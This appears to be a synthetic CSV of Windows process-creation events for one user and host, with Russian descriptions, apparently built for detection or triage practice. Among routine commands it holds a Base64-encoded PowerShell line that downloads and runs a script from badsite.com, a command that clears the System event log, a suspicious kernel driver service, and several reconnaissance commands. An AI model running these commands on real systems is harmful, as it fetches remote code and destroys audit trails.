"time","event_src.host","subject.account.name","object.process.id","object.process.parent.id","object.process.fullpath","object.process.cmdline","object.process.parent.fullpath","object.process.parent.cmdline","text"
"3/10/2026 10:15","smr.vk.com","i_popov","1240","4512","c:\windows\explorer.exe","C:\WINDOWS\Explorer.EXE","c:\windows\system32\userinit.exe","","Пользователь i_popov вошел в систему и запустил оболочку"
"3/10/2026 10:15","smr.vk.com","i_popov","5620","1240","c:\windows\system32\cmd.exe","""C:\WINDOWS\system32\cmd.exe""","c:\windows\explorer.exe","","Пользователь i_popov создал новый процесс cmd.exe на узле smr.vk.com"
"3/10/2026 10:15","smr.vk.com","i_popov","5688","5620","c:\windows\system32\conhost.exe","\??\C:\WINDOWS\system32\conhost.exe 0xffffffff -ForceV1","c:\windows\system32\cmd.exe","","Пользователь i_popov создал новый процесс conhost.exe на узле smr.vk.com"
"3/10/2026 10:16","smr.vk.com","i_popov","7120","5620","c:\windows\system32\ipconfig.exe","ipconfig  /all","c:\windows\system32\cmd.exe","","Пользователь i_popov создал новый процесс ipconfig.exe на узле smr.vk.com"
"3/10/2026 10:16","smr.vk.com","i_popov","7244","5620","c:\windows\system32\systeminfo.exe","systeminfo","c:\windows\system32\cmd.exe","","Пользователь i_popov создал новый процесс systeminfo.exe на узле smr.vk.com"
"3/10/2026 10:17","smr.vk.com","i_popov","8100","1240","c:\program files (x86)\microsoft\edge\application\msedge.exe","""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --no-first-run","c:\windows\explorer.exe","","Пользователь i_popov создал новый процесс msedge.exe на узле smr.vk.com"
"3/10/2026 10:17","smr.vk.com","i_popov","8320","8100","c:\program files (x86)\microsoft\edge\application\msedge.exe","--type=renderer --display-capture-permissions-policy-allowed","c:\program files (x86)\microsoft\edge\application\msedge.exe","","Пользователь i_popov создал новый процесс msedge.exe (дочерний) на узле smr.vk.com"
"3/10/2026 10:18","smr.vk.com","i_popov","9012","5620","c:\windows\system32\windowspowershell\v1.0\powershell.exe","powershell.exe -ExecutionPolicy Bypass -File ""\\filesrv01\scripts\inventory.ps1""","c:\windows\system32\cmd.exe","","Пользователь i_popov запустил скрипт powershell.exe из сетевой папки на узле smr.vk.com"
"3/10/2026 10:18","smr.vk.com","i_popov","9150","9012","c:\windows\system32\wbem\wmic.exe","wmic  product get name,version","c:\windows\system32\windowspowershell\v1.0\powershell.exe","","Пользователь i_popov создал новый процесс wmic.exe на узле smr.vk.com"
"3/10/2026 10:18","smr.vk.com","i_popov","9200","9012","c:\windows\system32\netsh.exe","netsh  wlan show profiles","c:\windows\system32\windowspowershell\v1.0\powershell.exe","","Пользователь i_popov создал новый процесс netsh.exe на узле smr.vk.com"
"3/10/2026 10:19","smr.vk.com","mow-ws-042$","440","112","c:\windows\system32\services.exe","","","","Система создала фоновую службу на узле smr.vk.com"
"3/10/2026 10:19","smr.vk.com","SYSTEM","9550","440","c:\windows\system32\sc.exe","sc  start WinDefend","c:\windows\system32\services.exe","","Пользователь SYSTEM запустил службу WinDefend"
"3/10/2026 10:20","smr.vk.com","i_popov","10100","5620","c:\windows\system32\nslookup.exe","nslookup dc01.vk.ru","c:\windows\system32\cmd.exe","","Пользователь i_popov создал новый процесс nslookup.exe на узле smr.vk.com"
"3/10/2026 10:20","smr.vk.com","i_popov","10250","5620","c:\windows\system32\net.exe","net  view /all","c:\windows\system32\cmd.exe","","Пользователь i_popov создал новый процесс net.exe на узле smr.vk.com"
"3/10/2026 10:21","smr.vk.com","i_popov","11040","1240","c:\windows\system32\notepad.exe","notepad.exe ""C:\Users\i_popov\Desktop\notes.txt""","c:\windows\explorer.exe","","Пользователь i_popov создал новый процесс notepad.exe на узле smr.vk.com"
"3/10/2026 10:22","smr.vk.com","i_popov","11500","5620","c:\windows\system32\windowspowershell\v1.0\powershell.exe","powershell  -Command ""Start-Process 'msiexec.exe' -ArgumentList '/i ""C:\Temp\agent_install.msi"" /quiet' -Verb RunAs""","c:\windows\system32\cmd.exe","","Пользователь i_popov запросил повышение прав для установки приложения через msiexec.exe"
"3/10/2026 10:22","smr.vk.com","SYSTEM","11620","720","c:\windows\system32\msiexec.exe","C:\WINDOWS\system32\msiexec.exe /V","c:\windows\system32\services.exe","","Пользователь SYSTEM создал новый процесс msiexec.exe на узле smr.vk.com"
"3/10/2026 10:23","smr.vk.com","i_popov","12050","5620","c:\windows\system32\tasklist.exe","tasklist  /v /fo csv","c:\windows\system32\cmd.exe","","Пользователь i_popov создал новый процесс tasklist.exe на узле smr.vk.com"
"3/10/2026 10:23","smr.vk.com","i_popov","12100","5620","c:\windows\system32\findstr.exe","findstr  /i ""sql""","c:\windows\system32\cmd.exe","","Пользователь i_popov создал новый процесс findstr.exe на узле smr.vk.com"
"3/10/2026 10:24","smr.vk.com","i_popov","12500","1240","c:\windows\system32\mstsc.exe","mstsc.exe","c:\windows\explorer.exe","","Пользователь i_popov запустил Remote Desktop Connection"
"3/10/2026 10:25","smr.vk.com","i_popov","13100","5620","c:\windows\system32\gpupdate.exe","gpupdate  /force","c:\windows\system32\cmd.exe","","Пользователь i_popov создал новый процесс gpupdate.exe на узле smr.vk.com"
"3/10/2026 10:25","smr.vk.com","SYSTEM","13150","1050","c:\windows\system32\gpscript.exe","gpscript.exe /Refresh","c:\windows\system32\svchost.exe","","Пользователь SYSTEM запустил обновление групповых политик"
"3/10/2026 10:26","smr.vk.com","i_popov","14000","5620","c:\windows\system32\whoami.exe","whoami  /groups","c:\windows\system32\cmd.exe","","Пользователь i_popov создал новый процесс whoami.exe на узле smr.vk.com"
"3/10/2026 10:27","smr.vk.com","i_popov","14520","5620","c:\windows\system32\windowspowershell\v1.0\powershell.exe","powershell  -enc SQBFAFMAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAcwBpAHQAZQAuAGMAbwBtAC8AcwAuAHAAcwAxACcAKQA=","c:\windows\system32\cmd.exe","","Пользователь i_popov запустил подозрительную команду PowerShell с Base64 кодированием на узле smr.vk.com"
"3/10/2026 10:28","smr.vk.com","i_popov","15010","1240","c:\windows\system32\taskmgr.exe","""C:\WINDOWS\system32\taskmgr.exe"" /7","c:\windows\explorer.exe","","Пользователь i_popov запустил Диспетчер задач"
"3/10/2026 10:29","smr.vk.com","i_popov","15500","5620","c:\windows\system32\ping.exe","ping  -t 8.8.8.8","c:\windows\system32\cmd.exe","","Пользователь i_popov создал новый процесс ping.exe на узле smr.vk.com"
"3/10/2026 10:30","smr.vk.com","i_popov","16100","5620","c:\windows\system32\net.exe","net  use Z: \\filesrv01\backup","c:\windows\system32\cmd.exe","","Пользователь i_popov подключил сетевой диск Z:"
"3/10/2026 10:31","smr.vk.com","i_popov","16200","5620","c:\windows\system32\robocopy.exe","robocopy  C:\Data Z:\Transfer /MIR /MT:8","c:\windows\system32\cmd.exe","","Пользователь i_popov запустил копирование данных через robocopy.exe"
"3/10/2026 10:32","smr.vk.com","i_popov","17000","5620","c:\windows\system32\chcp.com","chcp  65001","c:\windows\system32\cmd.exe","","Пользователь i_popov изменил кодировку консоли"
"3/10/2026 10:33","smr.vk.com","i_popov","","","","C:\ProgramData\Vendor\Driver\VirtualDisk.sys","","","Новая служба ""VDisk"" типа драйвер режима ядра создана на узле smr.vk.com"
"3/10/2026 10:34","smr.vk.com","i_popov","17500","1240","c:\windows\system32\calc.exe","calc.exe","c:\windows\explorer.exe","","Пользователь i_popov создал новый процесс calc.exe на узле smr.vk.com"
"3/10/2026 10:35","smr.vk.com","i_popov","18200","5620","c:\windows\system32\quser.exe","quser","c:\windows\system32\cmd.exe","","Пользователь i_popov проверил активные сессии пользователей"
"3/10/2026 10:36","smr.vk.com","i_popov","19000","5620","c:\windows\system32\wevtutil.exe","wevtutil  cl System","c:\windows\system32\cmd.exe","","Пользователь i_popov попытался очистить журнал событий System на узле smr.vk.com"
"3/10/2026 10:37","smr.vk.com","i_popov","19500","5620","c:\windows\system32\windowspowershell\v1.0\powershell.exe","powershell  -NoProfile -ExecutionPolicy Bypass -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'}""","c:\windows\system32\cmd.exe","","Пользователь i_popov запросил список запущенных служб через PowerShell"
"3/10/2026 10:38","smr.vk.com","mow-ws-042$","19800","800","c:\windows\system32\usoclient.exe","usoclient  StartScan","c:\windows\system32\svchost.exe","","Система инициировала проверку обновлений через usoclient.exe"
"3/10/2026 10:40","smr.vk.com","i_popov","20100","5620","c:\windows\system32\cmd.exe","exit","c:\windows\system32\cmd.exe","","Пользователь i_popov завершил работу командной строки"
